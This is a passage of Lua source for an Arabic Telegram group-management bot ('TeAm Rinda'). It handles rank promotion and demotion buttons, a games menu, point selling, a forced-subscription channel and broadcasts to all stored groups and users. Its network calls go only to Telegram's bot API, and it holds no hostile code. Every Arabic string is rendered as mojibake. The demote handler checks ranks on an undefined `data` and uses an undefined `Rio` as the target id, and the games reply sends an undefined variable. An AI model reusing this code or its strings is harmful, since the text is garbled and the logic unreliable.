keyboard.inline_keyboard = {{{text="โข ุฑูุน ูููุฒ โข",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="โข ุฑูุน ุงุฏูู โข",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="โข ุฑูุน ููุดุฆ โข",callback_data=msg.sender_user_id_..":SetConstructor:"..result.sender_user_id_},{text="โข ุฑูุน ูุฏูุฑ โข",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text="โข ุฑูุน ููุธู โข",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_},{text="โข ุฑูุน ููุดุฆ ุงุณุงุณู โข",callback_data=msg.sender_user_id_..":SetBasicConstructor:"..result.sender_user_id_}},{{text="โข ุฑูุน ูุงูู โข",callback_data=msg.sender_user_id_..":SetOwner:"..result.sender_user_id_},{text="โข ุฑูุน ูุทูุฑ โข",callback_data=msg.sender_user_id_..":SetSudoBot:"..result.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif SudoBot(msg) then
keyboard.inline_keyboard = {{{text="โข ุฑูุน ูููุฒ โข",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="โข ุฑูุน ุงุฏูู โข",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="โข ุฑูุน ููุดุฆ โข",callback_data=msg.sender_user_id_..":SetConstructor:"..result.sender_user_id_},{text="โข ุฑูุน ูุฏูุฑ โข",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text="โข ุฑูุน ููุธู โข",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_},{text="โข ุฑูุน ููุดุฆ ุงุณุงุณู โข",callback_data=msg.sender_user_id_..":SetBasicConstructor:"..result.sender_user_id_}},{{text="โข ุฑูุน ูุงูู โข",callback_data=msg.sender_user_id_..":SetOwner:"..result.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif Owner(msg) then
keyboard.inline_keyboard = {{{text="โข ุฑูุน ูููุฒ โข",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="โข ุฑูุน ุงุฏูู โข",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="โข ุฑูุน ููุดุฆ โข",callback_data=msg.sender_user_id_..":SetConstructor:"..result.sender_user_id_},{text="โข ุฑูุน ูุฏูุฑ โข",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text="โข ุฑูุน ููุธู โข",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_},{text="โข ุฑูุน ููุดุฆ ุงุณุงุณู โข",callback_data=msg.sender_user_id_..":SetBasicConstructor:"..result.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif BasicConstructor(msg) then
keyboard.inline_keyboard = {{{text="โข ุฑูุน ูููุฒ โข",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="โข ุฑูุน ุงุฏูู โข",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="โข ุฑูุน ููุดุฆ โข",callback_data=msg.sender_user_id_..":SetConstructor:"..result.sender_user_id_},{text="โข ุฑูุน ูุฏูุฑ โข",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text="โข ุฑูุน ููุธู โข",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif Constructor(msg) then
keyboard.inline_keyboard = {{{text="โข ุฑูุน ูููุฒ โข",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="โข ุฑูุน ุงุฏูู โข",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="โข ุฑูุน ููุธู โข",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_},{text="โข ุฑูุน ูุฏูุฑ โข",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif Manager(msg) then
keyboard.inline_keyboard = {{{text="โข ุฑูุน ูููุฒ โข",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="โข ุฑูุน ุงุฏูู โข",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif Admin(msg) then
keyboard.inline_keyboard = {{{text="โข ุฑูุน ูููุฒ โข",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
end
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text='..URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text ==('ุชูุฒูู') and ChCheck(msg) then
function prom_reply(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,dp) 
if dp.first_name_ == false then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุงูุญุณุงุจ ูุญุฐูู", 1, "md")
return false  
end
local Text = 'โ๏ธฐูู ุจุงุณุชุนูุงู ุงูุงุฒุฑุงุฑ ูุชูุฒูู ุงูุนุถู โข โค\nโ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')'
keyboard = {} 
if Sudo(msg) then
keyboard.inline_keyboard = {{{text="โข ุชูุฒูู ูููุฒ โข",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_},{text="โข ุชูุฒูู ุงุฏูู โข",callback_data=msg.sender_user_id_..":RemAdmin:"..result.sender_user_id_}},{{text="โข ุชูุฒูู ููุดุฆ โข",callback_data=msg.sender_user_id_..":RemConstructor:"..result.sender_user_id_},{text="โข ุชูุฒูู ูุฏูุฑ โข",callback_data=msg.sender_user_id_..":RemManager:"..result.sender_user_id_}},{{text="โข ุชูุฒูู ููุธู โข",callback_data=msg.sender_user_id_..":RemCleaner:"..result.sender_user_id_},{text="โข ุชูุฒูู ููุดุฆ  ุงุณุงุณู โข",callback_data=msg.sender_user_id_..":RemBasicConstructor:"..result.sender_user_id_}},{{text="โข ุชูุฒูู ูุงูู โข",callback_data=msg.sender_user_id_..":RemAbsConstructor:"..result.sender_user_id_},{text="โข ุชูุฒูู ูุทูุฑ โข",callback_data=msg.sender_user_id_..":RemSudoBot:"..result.sender_user_id_}},{{text="โข ุชูุฒูู ูุทูุฑ ุซุงููู โข",callback_data=msg.sender_user_id_..":RemSecondSudo:"..result.sender_user_id_},{text="โข ุชูุฒูู ูุทูุฑ ุงุณุงุณู โข",callback_data=msg.sender_user_id_..":RemRioSudo:"..result.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif RioSudo(msg) then
keyboard.inline_keyboard = {{{text="โข ุชูุฒูู ูููุฒ โข",callback_data=msg.sender_user_id_..":RemMem:"..Rio},{text="โข ุชูุฒูู ุงุฏูู โข",callback_data=msg.sender_user_id_..":RemAdmin:"..Rio}},{{text="โข ุชูุฒูู ููุดุฆ โข",callback_data=msg.sender_user_id_..":RemConstructor:"..Rio},{text="โข ุชูุฒูู ูุฏูุฑ โข",callback_data=msg.sender_user_id_..":RemManager:"..Rio}},{{text="โข ุชูุฒูู ููุธู โข",callback_data=msg.sender_user_id_..":RemCleaner:"..Rio},{text="โข ุชูุฒูู ููุดุฆ  ุงุณุงุณู โข",callback_data=msg.sender_user_id_..":RemBasicConstructor:"..Rio}},{{text="โข ุชูุฒูู ูุงูู โข",callback_data=msg.sender_user_id_..":RemOwner:"..Rio},{text="โข ุชูุฒูู ูุทูุฑ โข",callback_data=msg.sender_user_id_..":RemSudoBot:"..Rio}},{{text="โข ุชูุฒูู ูุทูุฑ ุซุงููู โข",callback_data=msg.sender_user_id_..":RemSecondSudo:"..Rio}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif SecondSudo(data) then
keyboard.inline_keyboard = {{{text="โข ุชูุฒูู ูููุฒ โข",callback_data=msg.sender_user_id_..":RemMem:"..Rio},{text="โข ุชูุฒูู ุงุฏูู โข",callback_data=msg.sender_user_id_..":RemAdmin:"..Rio}},{{text="โข ุชูุฒูู ููุดุฆ โข",callback_data=msg.sender_user_id_..":RemConstructor:"..Rio},{text="โข ุชูุฒูู ูุฏูุฑ โข",callback_data=msg.sender_user_id_..":RemManager:"..Rio}},{{text="โข ุชูุฒูู ููุธู โข",callback_data=msg.sender_user_id_..":RemCleaner:"..Rio},{text="โข ุชูุฒูู ููุดุฆ  ุงุณุงุณู โข",callback_data=msg.sender_user_id_..":RemBasicConstructor:"..Rio}},{{text="โข ุชูุฒูู ูุงูู โข",callback_data=msg.sender_user_id_..":RemOwner:"..Rio},{text="โข ุชูุฒูู ูุทูุฑ โข",callback_data=msg.sender_user_id_..":RemSudoBot:"..Rio}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif SudoBot(data) then
keyboard.inline_keyboard = {{{text="โข ุชูุฒูู ูููุฒ โข",callback_data=msg.sender_user_id_..":RemMem:"..Rio},{text="โข ุชูุฒูู ุงุฏูู โข",callback_data=msg.sender_user_id_..":RemAdmin:"..Rio}},{{text="โข ุชูุฒูู ููุดุฆ โข",callback_data=msg.sender_user_id_..":RemConstructor:"..Rio},{text="โข ุชูุฒูู ูุฏูุฑ โข",callback_data=msg.sender_user_id_..":RemManager:"..Rio}},{{text="โข ุชูุฒูู ููุธู โข",callback_data=msg.sender_user_id_..":RemCleaner:"..Rio},{text="โข ุชูุฒูู ููุดุฆ  ุงุณุงุณู โข",callback_data=msg.sender_user_id_..":RemBasicConstructor:"..Rio}},{{text="โข ุชูุฒูู ูุงูู โข",callback_data=msg.sender_user_id_..":RemOwner:"..Rio}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif Owner(data) then
keyboard.inline_keyboard = {{{text="โข ุชูุฒูู ูููุฒ โข",callback_data=msg.sender_user_id_..":RemMem:"..Rio},{text="โข ุชูุฒูู ุงุฏูู โข",callback_data=msg.sender_user_id_..":RemAdmin:"..Rio}},{{text="โข ุชูุฒูู ููุดุฆ โข",callback_data=msg.sender_user_id_..":RemConstructor:"..Rio},{text="โข ุชูุฒูู ูุฏูุฑ โข",callback_data=msg.sender_user_id_..":RemManager:"..Rio}},{{text="โข ุชูุฒูู ููุธู โข",callback_data=msg.sender_user_id_..":RemCleaner:"..Rio},{text="โข ุชูุฒูู ููุดุฆ  ุงุณุงุณู โข",callback_data=msg.sender_user_id_..":RemBasicConstructor:"..Rio}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif BasicConstructor(data) then
keyboard.inline_keyboard = {{{text="โข ุชูุฒูู ูููุฒ โข",callback_data=msg.sender_user_id_..":RemMem:"..Rio},{text="โข ุชูุฒูู ุงุฏูู โข",callback_data=msg.sender_user_id_..":RemAdmin:"..Rio}},{{text="โข ุชูุฒูู ููุดุฆ โข",callback_data=msg.sender_user_id_..":RemConstructor:"..Rio},{text="โข ุชูุฒูู ูุฏูุฑ โข",callback_data=msg.sender_user_id_..":RemManager:"..Rio}},{{text="โข ุชูุฒูู ููุธู โข",callback_data=msg.sender_user_id_..":RemCleaner:"..Rio}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif Constructor(data) then
keyboard.inline_keyboard = {{{text="โข ุชูุฒูู ูููุฒ โข",callback_data=msg.sender_user_id_..":RemMem:"..Rio},{text="โข ุชูุฒูู ุงุฏูู โข",callback_data=msg.sender_user_id_..":RemAdmin:"..Rio}},{{text="โข ุชูุฒูู ููุธู โข",callback_data=msg.sender_user_id_..":RemCleaner:"..Rio},{text="โข ุชูุฒูู ูุฏูุฑ โข",callback_data=msg.sender_user_id_..":RemManager:"..Rio}},{{text = 'โข Rinda TeAM โข',url="t.me/Source_Rinda"}}}
elseif Manager(data) then
keyboard.inline_keyboard = {{{text="โข ุชูุฒูู ูููุฒ โข",callback_data=msg.sender_user_id_..":RemMem:"..Rio},{text="โข ุชูุฒูู ุงุฏูู โข",callback_data=msg.sender_user_id_..":RemAdmin:"..Rio}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif Admin(data) then
keyboard.inline_keyboard = {{{text="โข ุชูุฒูู ูููุฒ โข",callback_data=msg.sender_user_id_..":RemMem:"..Rio}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
end
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text='..URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุงูุฑุงุจุท" then
local Link = DevRio:get(Rinda..'Rio:Link')
local Text = [[
*โ๏ธฐุงุฎุชุฑ ููุน ุงูุฑุงุจุท ูุฌูุจู*
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงูุฑุงุจุท ูุต โข",callback_data="/LinkText:"..msg.sender_user_id_},{text="โข ุงูุฑุงุจุท ุงููุงูู โข",callback_data="/Linkinline:"..msg.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Link or Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == 'ุงูุงูุนุงุจ' and ChCheck(msg) or text == 'ุงูุนุงุจ' and ChCheck(msg) or text == 'ุงููุนุจู' and ChCheck(msg) or text == 'โข ุงูุงูุนุงุจ โ' and ChCheck(msg) then
if not DevRio:get(Rinda..'Rio:Lock:Games'..msg.chat_id_) then
local Games = DevRio:get(Rinda..'Rio:Games')
local Text = [[
โ๏ธฐูุงุฆูุฉ ุงูุนุงุจ ุงููุฌููุนู โข โค
-----------------------------------------
โ๏ธฐูุนุจุฉ ุงูุชุฎููู โข ุฎูู
โ๏ธฐูุนุจุฉ ุงูุงูุซูู โข ุงูุซูู
โ๏ธฐูุนุจุฉ ุงูุนูุณ โข ุงูุนูุณ
โ๏ธฐูุนุจุฉ ุงูุงุณุฆูู โข ุงุณุฆูู
โ๏ธฐูุนุจุฉ ุงูุฑูููุช โข ุฑูููุช
โ๏ธฐูุนุจุฉ ุงูุญุฒูุฑู โข ุญุฒูุฑู
โ๏ธฐูุนุจุฉ ุงูุชุฑุชูุจ โข ุชุฑุชูุจ
โ๏ธฐูุนุจุฉ ุงููุนุงูู โข ูุนุงูู
โ๏ธฐูุนุจุฉ ุงูุชููุช โข ูุช ุชููุช
โ๏ธฐูุนุจุฉ ุงููุฎุชูู โข ุงููุฎุชูู
โ๏ธฐูุนุจุฉ ุงูุณูุงููุงุช โข ุณูุงููุงุช
โ๏ธฐูุนุจุฉ ุงููุญูุจุณ โข ุงููุญูุจุณ
โ๏ธฐูุนุจุฉ ุงูุฑูุงุถูุงุช โข ุฑูุงุถูุงุช
โ๏ธฐูุนุจุฉ ุงูุงููููุฒูู โข ุงููููุฒูู
-----------------------------------------
โ๏ธฐููุงุทู โข ุจูุน ููุงุทู
-----------------------------------------
โ๏ธฐ[โ ๐ฑ๐๐๐ฃ๐บ ๐ฒ](https://t.me/Source_Rinda)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงูุงูุนุงุจ ุงููุชุทูุฑู โข",callback_data="/GameInline:"..msg.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Game or Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == 'ุจูุน ููุงุทู' and ChCheck(msg) then
if tonumber((DevRio:get(Rinda..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูู ุชุฑุจุญ ุงู ููุทู\nโ๏ธฐุงุฑุณู โข ุงูุงูุนุงุจ ููุนุจ', 1, 'md')
else
DevRio0 = (DevRio:get(Rinda..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) * 50)
DevRio:incrby(Rinda..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_,DevRio0)
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐุชู ุจูุน '..(DevRio:get(Rinda..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_))..' ูู ููุงุทู\nโ๏ธฐูู ููุทู ุชุณุงูู 50 ุฑุณุงูู', 'md')
DevRio:del(Rinda..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_)
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == 'ุฑูุน ุงููุดุฑููู' and ChCheck(msg) or text == 'ุฑูุน ุงูุงุฏูููู' and ChCheck(msg) then  
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 200},function(arg,rio) 
local num = 0
local admins = rio.members_  
for i=0 , #admins do   
if rio.members_[i].bot_info_ == false and rio.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevRio:sadd(Rinda..'Rio:Admins:'..msg.chat_id_, admins[i].user_id_)   
num = num + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,dp) 
if dp.first_name_ == false then
DevRio:srem(Rinda..'Rio:Admins:'..msg.chat_id_, admins[i].user_id_)   
end
end,nil)   
else
DevRio:srem(Rinda..'Rio:Admins:'..msg.chat_id_, admins[i].user_id_)   
end 
if rio.members_[i].status_.ID == "ChatMemberStatusCreator" then  
Manager_id = admins[i].user_id_  
DevRio:sadd(Rinda..'Rio:BasicConstructor:'..msg.chat_id_,Manager_id)  
DevRio:sadd(Rinda..'Rio:RioConstructor:'..msg.chat_id_,Manager_id)   
end  
end  
if num == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐูุง ููุฌุฏ ุงุฏูููู ููุชู ุฑูุนูู\nโ๏ธฐุชู ุฑูุน ูุงูู ุงููุฌููุนู", 1, 'md')
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุฑูุน '..num..' ูู ุงูุงุฏูููู \nโ๏ธฐุชู ุฑูุน ูุงูู ุงููุฌููุนู', 1, 'md')
end
end,nil) 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text ==('ูููุนู') and ChCheck(msg) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
rtpa = 'ุงูููุดุฆ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
rtpa = 'ุงูุงุฏูู'
elseif da.status_.ID == "ChatMemberStatusMember" then
rtpa = 'ุนุถู'
end
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูููุนู โข '..rtpa, 1, 'md')
end,nil)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ูุนูููุงุชู" and ChCheck(msg) then
function get_me(extra,result,success)
local msguser = tonumber(DevRio:get(Rinda..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local user_msgs = DevRio:get(Rinda..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local cont = (tonumber(DevRio:get(Rinda..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local user_nkt = tonumber(DevRio:get(Rinda..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
if result.username_ then username = '@'..result.username_ else username = 'ูุง ููุฌุฏ' end
if result.last_name_ then lastname = result.last_name_ else lastname = '' end
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงุณูู โข โจ ['..result.first_name_..'] โฉ\nโ๏ธฐูุนุฑูู โข โจ ['..username..'] โฉ\nโ๏ธฐุงูุฏูู โข โจ `'..result.id_..'` โฉ\nโ๏ธฐููุงุทู โข โจ '..user_nkt..' โฉ\nโ๏ธฐุฑุณุงุฆูู โข โจ '..user_msgs..' โฉ\nโ๏ธฐุฌูุงุชู โข โจ '..cont..' โฉ\nโ๏ธฐุชูุงุนูู โข '..formsgs(msguser)..'\nโ๏ธฐุฑุชุจุชู โข '..IdRank(msg.sender_user_id_, msg.chat_id_), 1, 'md')
end
getUser(msg.sender_user_id_,get_me)
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุชุนููู ููุงุฉ ุงูุงุดุชุฑุงู" or text == "ุชุบููุฑ ููุงุฉ ุงูุงุดุชุฑุงู" or text == "ุชุนููู ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู" or text == "ูุถุน ููุงุฉ ุงูุงุดุชุฑุงู" or text == "โข ุชุนููู ููุงุฉ ุงูุงุดุชุฑุงู โ" then
if not Sudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุจุณ ุงููุทูเขช ุงูุงุณุงุณู ูฺชุฏเขช ', 1, 'md')
else
DevRio:setex(Rinda..'DevRio4'..msg.sender_user_id_,360,true)
send(msg.chat_id_, msg.id_, 'โ๏ธฐุงุฑุณู ูู ูุนุฑู ููุงุฉ ุงูุงุดุชุฑุงู ุงูุงู')
end
return false  
end
if text == "ุชูุนูู ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู" or text == "โข  ุชูุนูู ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู โ" then  
if not Sudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุจุณ ุงููุทูเขช ุงูุงุณุงุณู ูฺชุฏเขช ', 1, 'md')
else
if DevRio:get(Rinda..'Rio:ChId') then
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevRio:get(Rinda.."Rio:ChId"))
local GetInfo = JSON.decode(Check)
send(msg.chat_id_, msg.id_,"โ๏ธฐุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู ููุนู \nโ๏ธฐุนูู ุงูููุงุฉ โข [@"..GetInfo.result.username.."]")
else
DevRio:setex(Rinda..'DevRio4'..msg.sender_user_id_,360,true)
send(msg.chat_id_, msg.id_,"โ๏ธฐูุงุชูุฌุฏ ููุงุฉ ูุชูุนูู ุงูุงุดุชุฑุงู\nโ๏ธฐุงุฑุณู ูู ูุนุฑู ููุงุฉ ุงูุงุดุชุฑุงู ุงูุงู")
end
end
return false  
end
if text == "ุชุนุทูู ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู" or text == "โข  ุชุนุทูู ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู โ" then  
if not Sudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุจุณ ุงููุทูเขช ุงูุงุณุงุณู ูฺชุฏเขช ', 1, 'md')
else
DevRio:del(Rinda..'Rio:ChId')
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
end
return false  
end
if text == "ุญุฐู ููุงุฉ ุงูุงุดุชุฑุงู" or text == "ุญุฐู ููุงู ุงูุงุดุชุฑุงู" or text == "โข ุญุฐู ููุงุฉ ุงูุงุดุชุฑุงู โ" then
if not SecondSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุจุณ ุงููุทูเขช ุงูุงุณุงุณู ูฺชุฏเขช ', 1, 'md')
else
DevRio:del(Rinda..'Rio:ChId')
Dev_Rio(msg.chat_id_, msg.id_, 1,"โ๏ธฐุชู ุญุฐู ููุงุฉ ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู", 1, 'md') 
end
end
if SecondSudo(msg) then
if text == 'ุฌูุจ ููุงุฉ ุงูุงุดุชุฑุงู' or text == 'ููุงุฉ ุงูุงุดุชุฑุงู' or text == 'ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู' or text == 'ููุงุฉ ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู' or text == 'โข ููุงุฉ ุงูุงุดุชุฑุงู โ' then
if DevRio:get(Rinda..'Rio:ChId') then
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevRio:get(Rinda.."Rio:ChId"))
local GetInfo = JSON.decode(Check)
send(msg.chat_id_, msg.id_, "โ๏ธฐููุงุฉ ุงูุงุดุชุฑุงู โข [@"..GetInfo.result.username.."]")
else
send(msg.chat_id_, msg.id_, "โ๏ธฐูุงุชูุฌุฏ ููุงุฉ ูู ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู")
end
return false  
end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if SudoBot(msg) then
if text == 'ุงุฐุงุนู ูููู ุจุงูุชูุฌูู' and tonumber(msg.reply_to_message_id_) > 0 then
function RindaTeam(extra,result,success)
if DevRio:get(Rinda.."Rio:Send:Bot"..Rinda) and not RioSudo(msg) then 
send(msg.chat_id_, msg.id_,"โ๏ธฐุงูุงุฐุงุนู ูุนุทูู ูู ูุจู ุงููุทูุฑ ุงูุงุณุงุณู")
return false
end
local GpList = DevRio:smembers(Rinda.."Rio:Groups")
for k,v in pairs(GpList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
local PvList = DevRio:smembers(Rinda.."Rio:Users")
for k,v in pairs(PvList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชู ุงุฐุงุนุฉ ุฑุณุงูุชู ุจุงูุชูุฌูู \nโ๏ธฐโูู โข โจ '..#GpList..' โฉ ูุฌููุนู \nโ๏ธฐูุงูู โข โจ '..#PvList..' โฉ ูุดุชุฑู \n โ', 1, 'md')
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),RindaTeam)
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ูุดุงูุฏู ุงูููุดูุฑ" and ChCheck(msg) or text == "ูุดุงูุฏุงุช ุงูููุดูุฑ" and ChCheck(msg) or text == "ุนุฏุฏ ุงููุดุงูุฏุงุช" and ChCheck(msg) then
DevRio:set(Rinda..'Rio:viewget'..msg.sender_user_id_,true)
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุญุณูุง ูู ุจุงุนุงุฏุฉ ุชูุฌูู ููููุดูุฑ ุงูุฐู ุชุฑูุฏูู ุญุณุงุจ ูุดุงูุฏุงุชู', 1, 'md')
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุณูุฑุณ" and ChCheck(msg) or text == "ุงูุณูุฑุณ" and ChCheck(msg) or text == "ูุง ุณูุฑุณ" and ChCheck(msg) or text == "โข  ุงูุณูุฑุณ โ" and ChCheck(msg) then
Text = [[
Welcome To Source
โ๏ธฐ[TeAm Rinda](https://t.me/Source_Rinda)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text = 'โ โ ๐ฑ๐๐๐ฃ๐บ ๐ฒ',url="https://t.me/Source_Rinda"}},{{text = 'โ Developer',url="t.me/WYYYYY"}}}
local msg_id = msg.id_/2097152/0.5
